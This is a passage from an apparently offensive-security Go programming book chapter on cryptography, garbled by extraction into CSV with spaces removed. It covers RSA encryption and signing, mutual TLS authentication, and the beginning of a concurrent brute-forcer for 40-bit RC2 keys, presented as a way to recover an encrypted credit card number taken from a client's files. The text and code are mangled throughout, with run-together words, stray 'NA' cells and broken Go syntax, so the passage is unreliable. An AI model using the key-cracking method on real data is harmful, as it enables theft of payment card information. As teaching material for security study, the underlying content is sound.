"utilityfunction.Youreturntheresult.Ifallwentwell,this ",NA,NA
shouldbetheplaintextvalueofthecreditcardnumber.,NA,NA
Asamplerunoftheprogramproducestheexpectedresult:,"$gorunmain.go
  
  
 key=
  
  
 aca2d6b47cb5c04beafc3e483b296b20d07c32db16029a52808fde98786646c8
  
  
 ciphertext=
  
 7ff4a8272d6b60f1e7cfc5d8f5bcd047395e31e5fc83d062716082010f637c8f21150eabace62
  
 --
 snip
 --
  
  
 plaintext=4321123456789090",NA
Noticethatyoudidn’tdefinea,main(),NA
functioninthissample,NA,NA
"code.Whynot?Well,decryptingdatainunfamiliar ",NA,NA
environmentshasavarietyofpotentialnuancesandvariations,NA,NA
.,NA,NA
Aretheciphertextandkeyvaluesencodedorrawbinary?If,NA,NA
"they’reencoded,aretheyahexstringorBase64?Isthedata ",NA,NA
"locallyaccessible,ordoyouneedtoextractitfromadata ",NA,NA
"sourceorinteractwithahardwaresecuritymodule,for ",NA,NA
"example?Thepointis,decryptionisrarelyacopy-and-paste ",NA,NA
endeavorandoftenrequiressomelevelofunderstandingof ,NA,NA
"algorithms,modes,databaseinteraction,anddataencoding",NA,NA
". Forthisreason,we’vechosentoleadyoutotheanswerwith ",NA,NA
theexpectationthatyou’llinevitablyhavetofigureitout ,NA,NA
whenthetimeisright.,NA,NA
Knowingjustalittlebitaboutsymmetric-keyencryption ,NA,NA
canmakeyourpenetrationstestsmuchmoresuccessful.For ,NA,NA
"example,inourexperiencepilferingclientsource-code ",NA,NA
"repositories,we’vefoundthatpeopleoftenusetheAES ",NA,NA
"encryptionalgorithm,eitherinCBCorElectronicCodebook ",NA,NA
(ECB)mode.ECBmodehassomeinherentweaknessesand ,NA,NA
"CBCisn’tanybetter,ifimplementedincorrectly.Cryptocan ",NA,NA
"behardtounderstand,sooftendevelopersassumethatall ",NA,NA
cryptociphersandmodesareequallyeffectiveandare ,NA,NA
ignorantoftheirsubtleties.Althoughwedon’tconsider ,NA,NA
"ourselvescryptographers,weknowjustenoughtoimplement ",NA,NA
cryptosecurelyinGo—andtoexploitotherpeople’sdeficient ,NA,NA
implementations.,NA,NA
Althoughsymmetric-keyencryptionisfasterthan ,NA,NA
"asymmetriccryptography,itsuffersfrominherentkey-",NA,NA
"managementchallenges.Afterall,touseit,youmust ",NA,NA
distributethesamekeytoanyandallsystemsorapplications ,NA,NA
thatperformtheencryptionordecryptionfunctionsonthe ,NA,NA
"data.Youmustdistributethekeysecurely,oftenfollowing ",NA,NA
"strictprocessesandauditingrequirements.Also,relyingsolel",NA,NA
y onsymmetric-keycryptographypreventsarbitraryclients,NA,NA
"from,forexample,establishingencryptedcommunications ",NA,NA
withothernodes.Thereisn’tagoodwaytonegotiatethe ,NA,NA
"secretkey,norarethereauthenticationorintegrityassuranc",NA,NA
es formanycommonalgorithmsandmodes. Thatmeans ,1,NA
"anyone,whetherauthorizedormalicious,whoobtainsth",NA,NA
e secretkeycanproceedtouseit.,NA,NA
Thisiswhereasymmetriccryptographycanbeofuse.,NA,NA
AsymmetricCryptography,NA,NA
Manyoftheproblemsassociatedwithsymmetric-key ,NA,NA
encryptionaresolvedby,NA,NA
asymmetric,NA,NA
(or,NA,NA
public-key,NA,NA
) ,NA,NA
cryptography,NA,NA
",whichusestwoseparatebutmathematically ",NA,NA
relatedkeys.Oneisavailabletothepublicandtheotheris ,NA,NA
keptprivate.Dataencryptedbytheprivatekeycanbe ,NA,NA
"decryptedonlybythepublickey,anddataencryptedbythe ",NA,NA
publickeycanbedecryptedonlybytheprivatekey.Ifthe ,NA,NA
"privatekeyisprotectedproperlyandkept,well,private,then ",NA,NA
"dataencryptedwiththepublickeyremainsconfidential,since ",NA,NA
youneedthecloselyguardedprivatekeytodecryptit.Not ,NA,NA
"onlythat,butyoucouldusetheprivatekeytoauthenticatea ",NA,NA
"user.Theusercouldusetheprivatekeytosignmessages,for ",NA,NA
"example,whichthepubliccoulddecryptusingthepublickey.",NA,NA
"So,youmightbeasking,“What’sthecatch?Ifpublic-key ",NA,NA
"cryptographyprovidesalltheseassurances,whydoweeven ",NA,NA
"havesymmetric-keycryptography?”Goodquestion,you!The ",NA,NA
problemwithpublic-keyencryptionisitsspeed;it’salot ,NA,NA
slowerthanitssymmetriccounterpart.Togetthebestofboth ,NA,NA
"worlds(andavoidtheworst),you’lloftenfindorganizations ",NA,NA
usingahybridapproach:they’lluseasymmetriccryptoforthe ,NA,NA
"initialcommunicationsnegotiation,establishinganencrypte",NA,NA
d,NA,NA
channelthroughwhichtheycreateandexchangeasymmetric ,NA,NA
key(oftencalleda,NA,NA
sessionkey,NA,NA
).Becausethesessionkeyis ,NA,NA
"fairlysmall,usingpublic-keycryptoforthisprocessrequires ",NA,NA
littleoverhead.Boththeclientandserverthenhaveacopyof ,NA,NA
"thesessionkey,whichtheyusetomakefuture ",NA,NA
communicationsfaster.,NA,NA
Let’slookatacoupleofcommonusecasesforpublic-key ,NA,NA
"crypto.Specifically,we’lllookatencryption,signature ",NA,NA
"validation,andmutualauthentication.",NA,NA
EncryptionandSignatureValidation,NA,NA
"Forthisfirstexample,you’llusepublic-keycryptotoencrypt ",NA,NA
anddecryptamessage.You’llalsocreatethelogictosigna ,NA,NA
"messageandvalidatethatsignature.Forsimplicity,you’ll ",NA,NA
includeallofthislogicinasingle,main(),NA
function.Thisis,NA,NA
meanttoshowyouthecorefunctionalityandlogicsothatyou ,NA,NA
"canimplementit.Inareal-worldscenario,theprocessisa ",NA,NA
"littlemorecomplex,sinceyou’relikelytohavetworemote ",NA,NA
nodescommunicatingwitheachother.Thesenodeswould ,NA,NA
"havetoexchangepublickeys.Fortunately,thisexchange ",NA,NA
processdoesn’trequirethesamesecurityassurancesas ,NA,NA
exchangingsymmetrickeys.Recallthatanydataencrypted ,NA,NA
withthepublickeycanbedecryptedonlybytherelated ,NA,NA
"privatekey.So,evenifyouperformaman-in-the-middle ",NA,NA
attacktointerceptthepublic-keyexchangeandfuture ,NA,NA
"communications,youwon’tbeabletodecryptanyofthedata ",NA,NA
encryptedbythesamepublickey.Onlytheprivatekeycan ,NA,NA
decryptit.,NA,NA
Let’stakealookattheimplementationshownin,NA,NA
Listing ,NA,NA
11-5,NA,NA
.We’llelaborateonthelogicandcryptographic,NA,NA
functionalityaswereviewtheexample.,"funcmain(){
  
 var( 
  
 errerror 
  
 privateKey*rsa.PrivateKey publicKey*rsa.PublicKey 
 message,plaintext,ciphertext,signature,label[]byte )
  
 ifprivateKey,err=rsa.GenerateKey(rand.Reader,2048)❶;err!=nil{ 
 log.Fatalln(err) 
  
 } 
  
 publicKey=&privateKey.PublicKey❷
  
 label=[]byte("""") 
  
 message=[]byte(""Somesupersecretmessage,maybeasessionkeyeven"") 
 ciphertext,err=rsa.EncryptOAEP(sha256.New(),rand.Reader,publicKey, 
 message,label)❸
  
 iferr!=nil{ 
  
 log.Fatalln(err) 
  
 } 
  
 fmt.Printf(""Ciphertext:%x\n"",ciphertext)
  
 plaintext,err=rsa.DecryptOAEP(sha256.New(),rand.Reader,privateKey, 
 ciphertext,label)❹
  
 iferr!=nil{
  
 log.Fatalln(err) 
  
 } 
  
 fmt.Printf(""Plaintext:%s\n"",plaintext)
  
 h:=sha256.New() 
  
 h.Write(message) 
  
 signature,err=rsa.SignPSS(rand.Reader,privateKey,crypto.SHA256, 
 h.Sum(nil),nil)❺
  
 iferr!=nil{ 
  
 log.Fatalln(err) 
  
 }
  
 fmt.Printf(""Signature:%x\n"",signature)",NA
Theprogramdemonstratestwoseparatebutrelatedpublic,NA,NA
-keycryptofunctions:encryption/decryptionandmessage ,NA,NA
signing.Youfirstgenerateapublic/privatekeypairbycalling ,NA,NA
the,rsa.GenerateKey(),NA
function❶.Yousupplyarandomreader ,NA,NA
andakeylengthasinputparameterstothefunction.Assuming ,NA,NA
therandomreaderandkeylengthsareadequatetogeneratea ,NA,NA
"key,theresultisan",*rsa.PrivateKey,NA
instancethatcontainsafield,NA,NA
whosevalueisthepublickey.Younowhaveaworkingkey ,NA,NA
pair.Youassignthepublickeytoitsownvariableforthesake ,NA,NA
ofconvenience❷.,NA,NA
Thisprogramgeneratesthiskeypaireverytimeit’srun.In ,NA,NA
"mostcircumstances,suchasSSHcommunications,you’ll ",NA,NA
"generatethekeypairasingletime,andthensaveandstorethe ",NA,NA
"keystodisk.Theprivatekeywillbekeptsecure,andthe ",NA,NA
publickeywillbedistributedtoendpoints.We’reskipping ,NA,NA
"keydistribution,protection,andmanagementhere,and ",NA,NA
focusingonlyonthecryptographicfunctions.,NA,NA
"Nowthatyou’vecreatedthekeys,youcanstartusingthem ",NA,NA
forencryption.Youdosobycallingthefunction ,rsa.EncryptOAEP(),NA
"❸,whichacceptsahashingfunction,areader ",NA,NA
"touseforpaddingandrandomness,yourpublickey,the ",NA,NA
"messageyouwishtoencrypt,andanoptionallabel.This ",NA,NA
functionreturnsanerror(iftheinputscausethealgorithmto,NA,NA
fail)andourciphertext.Youcanthenpassthesamehashing ,NA,NA
"function,areader,yourprivatekey,yourciphertext,anda ",NA,NA
labelintothefunction,rsa.DecryptOAEP(),NA
❹.Thefunction ,NA,NA
decryptstheciphertextbyusingyourprivatekeyandreturns ,NA,NA
thecleartextresult.,NA,NA
Noticethatyou’reencryptingthemessagewiththepublic ,NA,NA
key.Thisensuresthatonlytheholderoftheprivatekeywill ,NA,NA
havetheabilitytodecryptthedata.Nextyoucreateadigital ,NA,NA
signaturebycalling,rsa.SignPSS(),NA
"❺.Youpasstoit,again,a ",NA,NA
"randomreader,yourprivatekey,thehashingfunctionyou’re ",NA,NA
"using,thehashvalueofthemessage,anda",nil,NA
value,NA,NA
representingadditionaloptions.Thefunctionreturnsany ,NA,NA
errorsandtheresultingsignaturevalue.Muchlikehuman ,NA,NA
"DNAorfingerprints,thissignatureuniquelyidentifiesthe ",NA,NA
"identityofthesigner(thatis,theprivatekey).Anybody ",NA,NA
holdingthepublickeycanvalidatethesignaturetonotonly ,NA,NA
determinetheauthenticityofthesignaturebutalsovalidateth,NA,NA
"e integrityofthemessage.Tovalidatethesignature,youpass ",NA,NA
"thepublickey,hashfunction,hashvalue,signature,and ",NA,NA
additionaloptionsto,rsa.VerifyPSS(),NA
❻.Noticethatinthiscase ,NA,NA
"you’repassingthepublickey,nottheprivatekey,intothis ",NA,NA
function.Endpointswishingtovalidatethesignaturewon’t ,NA,NA
"haveaccesstotheprivatekey,norwillvalidationsucceedif ",NA,NA
youinputthewrongkeyvalue.The,rsa.VerifyPSS(),NA
function,NA,NA
returns,nil,NA
whenthesignatureisvalidandanerrorwhenit’s,NA,NA
invalid.,NA,NA
Hereisasamplerunoftheprogram.Itbehavesas ,NA,NA
"expected,encryptingthemessagebyusingapublickey, ",NA,NA
"decryptingitbyusingaprivatekey,andvalidatingthe ",NA,NA
signature:,NA,NA
"Nextup,let’slookatanotherapplicationofpublic-key ",NA,NA
cryptography:mutualauthentication.,NA,NA
MutualAuthentication,NA,NA
Mutualauthentication,NA,NA
istheprocessbywhichaclientand ,NA,NA
serverauthenticateeachother.Theydothiswithpublic-key ,NA,NA
cryptography;boththeclientandservergenerate ,NA,NA
"public/privatekeypairs,exchangepublickeys,andusethe ",NA,NA
publickeystovalidatetheauthenticityandidentityofthe ,NA,NA
"otherendpoint.Toaccomplishthisfeat,boththeclientand ",NA,NA
"servermustdosomelegworktosetuptheauthorization, ",NA,NA
explicitlydefiningthepublickeyvaluewithwhichtheyintend ,NA,NA
tovalidatetheother.Thedownsidetothisprocessisthe ,NA,NA
administrativeoverheadofhavingtocreateuniquekeypairs ,NA,NA
foreverysinglenodeandensuringthattheserverandthe ,NA,NA
clientnodeshavetheappropriatedatatoproceedproperly.,NA,NA
"Tobegin,you’llknockouttheadministrativetasksof ",NA,NA
"creatingkeypairs.You’llstorethepublickeysasself-signed, ",NA,NA
PEM-encodedcertificates.Let’susethe,openssl,NA
utilitytocreate,NA,NA
"thesefiles.Onyourserver,you’llcreatetheserver’sprivate ",NA,NA
keyandcertificatebyenteringthefollowing:,"$opensslreq-nodes-x509-newkeyrsa:4096-keyoutserverKey.pem-out
  
  
 serverCrt.pem-days365",NA
The,openssl,NA
"commandwillpromptyouforvariousinputs,to",NA,NA
whichyoucansupplyarbitraryvaluesforthisexample.The ,NA,NA
commandcreatestwofiles:,NA,NA
serverKey.pem,NA,NA
and,NA,NA
serverCrt.pem,NA,NA
.,NA,NA
Thefile,NA,NA
serverKey.pem,NA,NA
"containsyourprivatekey,andyou ",NA,NA
shouldprotectit.The,NA,NA
serverCrt.pem,NA,NA
filecontainstheserver’s ,NA,NA
"publickey,whichyou’lldistributetoeachofyourconnecting ",NA,NA
clients.,NA,NA
"Foreveryconnectingclient,you’llrunacommandsimilar ",NA,NA
totheprecedingone:,"$opensslreq-nodes-x509-newkeyrsa:4096-keyoutclientKey.pem-out
  
  
 clientCrt.pem-days365",NA
Thiscommandalsogeneratestwofiles:,NA,NA
clientKey.pem,NA,NA
and ,NA,NA
clientCrt.pem,NA,NA
".Muchaswiththeserveroutput,youshould ",NA,NA
protecttheclient’sprivatekey.The,NA,NA
clientCrt.pem,NA,NA
certificate ,NA,NA
filewillbetransferredtoyourserverandloadedbyyour ,NA,NA
program.Thiswillallowyoutoconfigureandidentifythe ,NA,NA
"clientasanauthorizedendpoint.You’llhavetocreate, ",NA,NA
"transfer,andconfigureacertificateforeachadditionalclient ",NA,NA
sothattheservercanidentifyandexplicitlyauthorizethem.,NA,NA
In,NA,NA
Listing11-6,NA,NA
",yousetupanHTTPSserverthatrequiresa ",NA,NA
"clienttoprovidealegitimate,authorizedcertificate.","funchelloHandler(whttp.ResponseWriter,r*http.Request){❶
  
 fmt.Printf(""Hello:%s\n"",r.TLS.PeerCertificates[0].Subject.CommonName)❷
  
 fmt.Fprint(w,""Authenticationsuccessful"")
  
  
 }
  
  
 funcmain(){
  
 var( 
  
 errerror 
  
 clientCert[]byte
  
 pool*x509.CertPool",NA
Outsidethe,main(),NA
"function,theprogramdefinesa ",helloHandler(),NA
function❶.Aswediscussedwaybackin,NA,NA
Chapters ,NA,NA
3,NA,NA
and,NA,NA
4,NA,NA
",thehandlerfunctionacceptsan",http.ResponseWriter,NA
instanceandthe,http.Request,NA
itself.Thishandlerisprettyboring. ,NA,NA
Itlogsthecommonnameoftheclientcertificatereceived❷. ,NA,NA
Thecommonnameisaccessedbyinspectingthe,http.Request,NA
’s,TLS,NA
fieldanddrillingdownintothecertificate,PeerCertificates,NA
data.Thehandlerfunctionalsosendstheclientamessage ,NA,NA
indicatingthatauthenticationwassuccessful.,NA,NA
"Buthowdoyoudefinewhichclientsareauthorized,and ",NA,NA
howdoyouauthenticatethem?Theprocessisfairlypainless.,NA,NA
Youfirstreadtheclient’scertificatefromthePEMfilethe ,NA,NA
clientcreatedpreviously❸.Becauseit’spossibletohave ,NA,NA
"morethanoneauthorizedclientcertificate,youcreatea ",NA,NA
certificatepoolandcall,pool.AppendCertsFromPEM(clientCert),NA
toadd ,NA,NA
theclientcertificatetoyourpool❹.Youperformthisstepfor ,NA,NA
eachadditionalclientyouwishtoauthenticate.,NA,NA
"Next,youcreateyourTLSconfiguration.Youexplicitlyset ",NA,NA
the,ClientCAs,NA
fieldtoyour,pool,NA
andconfigure,ClientAuth,NA
to ,tls.RequireAndVerifyClientCert,NA
❺.Thisconfigurationdefinesyour ,NA,NA
poolofauthorizedclientsandrequiresclientstoproperly ,NA,NA
identifythemselvesbeforethey’llbeallowedtoproceed.You ,NA,NA
issueacallto,tlsConf.BuildNameToCertificate(),NA
sothattheclient’s,NA,NA
commonandsubjectalternatenames—thedomainnamesfor ,NA,NA
whichthecertificatewasgenerated—willproperlymapto ,NA,NA
"theirgivencertificate❻.YoudefineyourHTTPserver, ",NA,NA
"explicitlysettingyourcustomconfiguration❼,andstartthe ",NA,NA
serverbycalling,server.ListenAndServeTLS(),NA
",passingtoittheserver ",NA,NA
certificateandprivate-keyfilesyoucreatedpreviously❽. ,NA,NA
Notethatyoudon’tusetheclient’sprivate-keyfileanywhere ,NA,NA
"intheservercode.Aswe’vesaidbefore,theprivatekey ",NA,NA
remainsprivate;yourserverwillbeabletoidentifyand ,NA,NA
authorizeclientsbyusingonlytheclient’spublickey.Thisis ,NA,NA
thebrillianceofpublic-keycrypto.,NA,NA
Youcanvalidateyourserverbyusing,curl,NA
.Ifyougenerate,NA,NA
"andsupplyabogus,unauthorizedclientcertificateandkey, ",NA,NA
you’llbegreetedwithaverbosemessagetellingyouso:,"$curl-ik-XGET--certbadCrt.pem--keybadKey.pem\
  
  
 https://server.blackhat-go.local:9443/hello",NA
"You’llalsogetamoreverbosemessageontheserver,",NA,NA
somethinglikethis:,"http:TLShandshakeerrorfrom127.0.0.1:61682:remoteerror:tls:unknown
  
  
 certificateauthority",NA
"Ontheflipside,ifyousupplythevalidcertificateandthe",NA,NA
"keythatmatchesthecertificateconfiguredintheserverpool,",NA,NA
you’llenjoyasmallmomentofgloryasitsuccessfully,NA,NA
authenticates:,"$curl-ik-XGET--certclientCrt.pem--keyclientKey.pem\
  
  
 https://server.blackhat-go.local:9443/hello
  
  
 HTTP/1.1200OK
  
  
 Date:Fri,09Oct202016:55:52GMT
  
  
 Content-Length:25
  
  
 Content-Type:text/plain;charset=utf-8
  
  
 Authenticationsuccessful",NA
Thismessagetellsyoutheserverworksasexpected.,NA,NA
"Now,let’shavealookataclient(",NA,NA
Listing11-7,NA,NA
).Youcan,NA,NA
runtheclientoneitherthesamesystemastheserverora,NA,NA
"differentone.Ifit’sonadifferentsystem,you’llneedto",NA,NA
transfer,NA,NA
clientCrt.pem,NA,NA
totheserverand,NA,NA
serverCrt.pem,NA,NA
tothe,NA,NA
client.,"funcmain(){
  
  
 var(
  
  
 errerror
  
  
 certtls.Certificate
  
  
 serverCert,body[]byte
  
  
 pool*x509.CertPool
  
  
 tlsConf*tls.Config",NA
Alotofthecertificatepreparationandconfigurationwill ,NA,NA
looksimilartowhatyoudidintheservercode:creatingapool ,NA,NA
ofcertificatesandpreparingsubjectandcommonnames.,NA,NA
Sinceyouwon’tbeusingtheclientcertificateandkeyasa ,NA,NA
"server,youinsteadcall","tls.LoadX509KeyPair(""clientCrt.pem"", 
  
 ""clientKey.pem"")",NA
toloadthemforuselater❶.Youalsoreadthe ,NA,NA
"servercertificate,addingittothepoolofcertificatesyouwish ",NA,NA
toallow❷.Youthenusethepoolandclientcertificates❸to ,NA,NA
"buildyourTLSconfiguration❹,andcall ",tlsConf.BuildNameToCertificate(),NA
tobinddomainnamestotheir ,NA,NA
respectivecertificates❺.,NA,NA
"Sinceyou’recreatinganHTTPclient,youhavetodefinea ",NA,NA
"transport❻,correlatingitwithyourTLSconfiguration.You ",NA,NA
canthenusethetransportinstancetocreatean,http.Client,NA
struct,NA,NA
❼.Aswediscussedin,NA,NA
Chapters3,NA,NA
and,NA,NA
4,NA,NA
",youcanusethis ",NA,NA
clienttoissueanHTTPGETrequestvia ,"client.Get(""https://server.blackhat-go.local:9443/hello"")",NA
❽.,NA,NA
Allthemagichappensbehindthescenesatthispoint.,NA,NA
Mutualauthenticationisperformed—theclientandtheserver ,NA,NA
"mutuallyauthenticateeachother.Ifauthenticationfails,the ",NA,NA
"programreturnsanerrorandexits.Otherwise,youreadthe ",NA,NA
HTTPresponsebodyanddisplayittostdout❾.Runningyour ,NA,NA
"clientcodeproducestheexpectedresult,specifically,that ",NA,NA
therewerenoerrorsthrownandthatauthenticationsucceeds:,"$gorunmain.go
  
  
 Success:Authenticationsuccessful",NA
Yourserveroutputisshownnext.Recallthatyou ,NA,NA
configuredtheservertologahellomessagetostandard ,NA,NA
output.Thismessagecontainsthecommonnameofthe ,NA,NA
"connectingclient,extractedfromthecertificate:","$gorunmain.go
  
  
 Hello:client.blackhat-go.local",NA
Younowhaveafunctionalsampleofmutual ,NA,NA
"authentication.Tofurtherenhanceyourunderstanding,we ",NA,NA
encourageyoutotweakthepreviousexamplessotheywork ,NA,NA
overTCPsockets.,NA,NA
"Inthenextsection,you’lldedicateyoureffortstoamore ",NA,NA
deviouspurpose:brute-forcingRC2encryptioncipher ,NA,NA
symmetrickeys.,NA,NA
BRUTE-FORCINGRC2,NA,NA
RC2,NA,NA
isasymmetric-keyblockciphercreatedbyRonRivestin ,NA,NA
"1987.Promptedbyrecommendationsfromthegovernment, ",NA,NA
"thedesignersuseda40-bitencryptionkey,whichmadethe ",NA,NA
cipherweakenoughthattheUSgovernmentcouldbrute-force ,NA,NA
thekeyanddecryptcommunications.Itprovidedample ,NA,NA
confidentialityformostcommunicationsbutallowedthe ,NA,NA
"governmenttopeepintochatterwithforeignentities,for ",NA,NA
"example.Ofcourse,backinthe1980s,brute-forcingthekey ",NA,NA
"requiredsignificantcomputingpower,andonlywell-funded ",NA,NA
nationstatesorspecialtyorganizationshadthemeansto ,NA,NA
decryptitinareasonableamountoftime.Fast-forward30 ,NA,NA
"years;today,thecommonhomecomputercanbrute-forcea ",NA,NA
40-bitkeyinafewdaysorweeks.,NA,NA
"So,whattheheck,let’sbruteforcea40-bitkey.",NA,NA
GettingStarted,NA,NA
"Beforewediveintothecode,let’ssetthestage.Firstofall, ",NA,NA
neitherthestandardnorextendedGocryptolibrarieshavean ,NA,NA
"RC2packageintendedforpublicconsumption.However, ",NA,NA
there’saninternalGopackageforit.Youcan’timportinternal ,NA,NA
"packagesdirectlyinexternalprograms,soyou’llhavetofind ",NA,NA
anotherwaytouseit.,NA,NA
"Second,tokeepthingssimple,you’llmakesome ",NA,NA
assumptionsaboutthedatathatyounormallywouldn’twantt,NA,NA
"o make.Specifically,you’llassumethatthelengthofyour ",NA,NA
cleartextdataisamultipleoftheRC2blocksize(8bytes)to ,NA,NA
avoidcloudingyourlogicwithadministrativetaskslike ,NA,NA
handlingPKCS#5padding.Handlingthepaddingissimilarto ,NA,NA
whatyoudidwithAESpreviouslyinthischapter(see,NA,NA
Listing ,NA,NA
11-4,NA,NA
"),butyou’dneedtobemorediligentinvalidatingthe ",NA,NA
contentstomaintaintheintegrityofthedatayou’llbeworking ,NA,NA
with.You’llalsoassumethatyourciphertextisanencrypted ,NA,NA
creditcardnumber.You’llcheckthepotentialkeysby ,NA,NA
"validatingtheresultingplaintextdata.Inthiscase,validating ",NA,NA
thedatainvolvesmakingsurethetextisnumericandthen ,NA,NA
subjectingittoa,NA,NA
Luhncheck,NA,NA
",whichisamethodofvalidating ",NA,NA
creditcardnumbersandothersensitivedata.,NA,NA
"Next,you’llassumeyouwereabletodetermine—perhaps ",NA,NA
frompilferingfilesystemdataorsourcecode—thatthedatais ,NA,NA
encryptedusinga40-bitkeyinECBmodewithno ,NA,NA
"initializationvector.RC2supportsvariable-lengthkeysand, ",NA,NA
"sinceit’sablockcipher,canoperateindifferentmodes.In ",NA,NA
"ECBmode,whichisthesimplestmode,blocksofdataare",NA,NA
encryptedindependentlyofotherblocks.Thiswillmakeyour ,NA,NA
"logicalittlemorestraightforward.Lastly,althoughyoucan ",NA,NA
"crackthekeyinanonconcurrentimplementation,ifyouso ",NA,NA
"choose,aconcurrentimplementationwillbefarbetter ",NA,NA
"performing.Ratherthanbuildingthisthingiteratively, ",NA,NA
showingfirstanonconcurrentversionfollowedbya ,NA,NA
"concurrentone,we’llgostraightfortheconcurrentbuild.",NA,NA
"Nowyou’llinstallacoupleofprerequisites.First,retrieve ",NA,NA
theofficialRC2Goimplementationfrom ,NA,NA
https://github.com/golang/crypto/blob/master/pkcs12/in,NA,NA
ternal/ ,NA,NA
rc2/rc2.go,NA,NA
.You’llneedtoinstallthisinyourlocalworkspace ,NA,NA
sothatyoucanimportitintoyourbrute-forcer.Aswe ,NA,NA
"mentionedearlier,thepackageisaninternalpackage,meaning ",NA,NA
"that,bydefault,outsidepackagescan’timportanduseit.This ",NA,NA
"isalittlehacky,butit’llpreventyoufromhavingtousea third-",NA,NA
partyimplementationor—shudder—writingyourown ,NA,NA
"RC2ciphercode.Ifyoucopyitintoyourworkspace,thenon-",NA,NA
exportedfunctionsandtypesbecomepartofyour ,NA,NA
"developmentpackage,whichmakesthemaccessible.",NA,NA
Let’salsoinstallapackagethatyou’llusetoperformthe ,NA,NA
Luhncheck:,"$
 gogetgithub.com/joeljunstrom/go-luhn",NA
ALuhncheckcalculateschecksumsoncreditcardnumbers ,NA,NA
orotheridentificationdatatodeterminewhetherthey’revalid. ,NA,NA
You’llusetheexistingpackageforthis.It’swell-documented ,NA,NA
andit’llsaveyoufromre-creatingthewheel.,NA,NA
Nowyoucanwriteyourcode.You’llneedtoiterate ,NA,NA
"througheverycombinationoftheentirekeyspace(40-bits), ",NA,NA
"decryptingyourciphertextwitheachkey,andthenvalidating",NA,NA
yourresultbymakingsureitbothconsistsofonlynumeric ,NA,NA
charactersandpassesaLuhncheck.You’llusea ,NA,NA
producer/consumermodeltomanagethework—,NA,NA
theproducer ,NA,NA
willpushakeytoachannelandtheconsumerswillreadthe ,NA,NA
keyfromthechannelandexecuteaccordingly.Theworkitself ,NA,NA
willbeasinglekeyvalue.Whenyoufindakeythatproduces ,NA,NA
properlyvalidatedplaintext(indicatingyoufoundacreditcard ,NA,NA
"number),you’llsignaleachofthegoroutinestostoptheir work.",NA,NA
Oneoftheinterestingchallengesofthisproblemishowto ,NA,NA
"iteratethekeyspace.Inoursolution,youiterateitusinga",for,NA
"loop,traversingthekeyspacerepresentedas",uint64,NA
values.The,NA,NA
"challenge,asyou’llsee,isthat",uint64,NA
occupies64bitsofspace,NA,NA
"inmemory.So,convertingfroma",uint64,NA
toa40-bit(5-byte),[]byte,NA
RC2keyrequiresthatyoucropoff24bits(3bytes)of,NA,NA
"unnecessarydata.Hopefully,thisprocessbecomesclearonce ",NA,NA
"you’velookedatthecode.We’lltakeitslow,breakingdown ",NA,NA
sectionsoftheprogramandworkingthroughthemonebyone. ,NA,NA
Listing11-8,NA,NA
beginstheprogram.,"import(
  
 ""crypto/cipher"" 
  
 ""encoding/binary"" 
  
 ""encoding/hex"" 
  
 ""fmt"" 
  
 ""log"" 
  
 ""regexp"" 
  
 ""sync""
  
 ❶luhn""github.com/joeljunstrom/go-luhn""
  
  
 )
  
 ❷""github.com/bhg/ch-11/rc2-brute/rc2""
  
 HivaNetwork.Com",NA
We’veincludedthe,import,NA
statementsheretodrawattention ,NA,NA
totheinclusionofthethird-party,go-luhn,NA
"package❶,aswellas ",NA,NA
theinclusionofthe,rc2,NA
package❷youclonedfromthe ,NA,NA
internalGorepository.Youalsocompilearegularexpression,NA,NA
❸thatyou’llusetocheckwhethertheresultingplaintext ,NA,NA
blockis8bytesofnumericdata.,NA,NA
"Notethatyou’rechecking8bytesofdataandnot16bytes, ",NA,NA
whichisthelengthofyourcreditcardnumber.You’re ,NA,NA
checking8bytesbecausethat’sthelengthofanRC2block. ,NA,NA
"You’llbedecryptingyourciphertextblockbyblock,soyou ",NA,NA
cancheckthefirstblockyoudecrypttoseewhetherit’s ,NA,NA
"numeric.Ifthe8bytesoftheblockaren’tallnumeric,youcan ",NA,NA
confidentlyassumethatyouaren’tdealingwithacreditcard ,NA,NA
numberandcanskipthedecryptionofthesecondblockof ,NA,NA
ciphertextaltogether.Thisminorperformanceimprovement ,NA,NA
willsignificantlyreducethetimeittakestoexecutemillions ,NA,NA
oftimesover.,NA,NA
"Lastly,youdefineatypenamed",CryptoData,NA
❹thatyou’lluse ,NA,NA
tostoreyourkeyanda,cipher.Block,NA
.You’llusethis,struct,NA
to,NA,NA
"defineunitsofwork,whichproducerswillcreateand ",NA,NA
consumerswillactupon.,NA,NA
ProducingWork,NA,NA
Let’slookattheproducerfunction(,NA,NA
Listing11-9,NA,NA
).Youplace,NA,NA
thisfunctionafteryourtypedefinitionsinthepreviouscode ,NA,NA
listing.,"❶funcgenerate(start,stopuint64,outchan<-*CryptoData,\ 
 done<-chanstruct{},wg*sync.WaitGroup){
  
  
 ❷wg.Add(1)
  
  
 ❸gofunc(){
  
   
 ❹deferwg.Done() 
  
 var(
  
 blockcipher.Block 
  
 errerror 
  
 key[]byte 
  
 data*CryptoData
  
 )
  
  
 ❺fori:=start;i<=stop;i++{ 
  
 key=make([]byte,8)
  
  
  
 ❻select{
  
  
  
 ❼case<-done: 
  
 return
  
  
  
 ❽default:
  
  
   
 ❾binary.BigEndian.PutUint64(key,i) 
  
 ifblock,err=rc2.New(key[3:],40);err!=nil{
  
 log.Fatalln(err) 
  
 } 
  
 data=&CryptoData{ 
  
 block:block, 
  
 key:key[3:],
  
 }
  
  
 ❿out<-data 
  
 }
  
 } 
  
 }()
  
 return
  
 }
  
 Listing11-9:TheRC2producerfunction(
 /ch-11/rc2-brute/main.go
 )",NA
Yourproducerfunctionisnamed,generate(),NA
❶.Itacceptstwo ,uint64,NA
variablesusedtodefineasegmentofthekeyspaceon,NA,NA
"whichtheproducerwillcreatework(basically,therangeover ",NA,NA
whichthey’llproducekeys).Thisallowsyoutobreakupthe ,NA,NA
"keyspace,distributingportionsofittoeachproducer.",NA,NA
Thefunctionalsoacceptstwochannels:a,*CryptData,NA
write-,NA,NA
onlychannelusedforpushingworktoconsumersanda ,NA,NA
generic,struct,NA
channelthat’llbeusedforreceivingsignalsfrom,NA,NA
"consumers.Thissecondchannelisnecessarysothat,for ",NA,NA
"example,aconsumerthatidentifiesthecorrectkeycan ",NA,NA
explicitlysignaltheproducertostopproducing.Nosense ,NA,NA
creatingmoreworkifyou’vealreadysolvedtheproblem. ,NA,NA
"Lastly,yourfunctionacceptsa",WaitGroup,NA
tobeusedfortracking,NA,NA
andsynchronizingproducerexecution.Foreachconcurrent ,NA,NA
"producerthatruns,youexecute",wg.Add(1),NA
❷totellthe,WaitGroup,NA
thatyoustartedanewproducer.,NA,NA
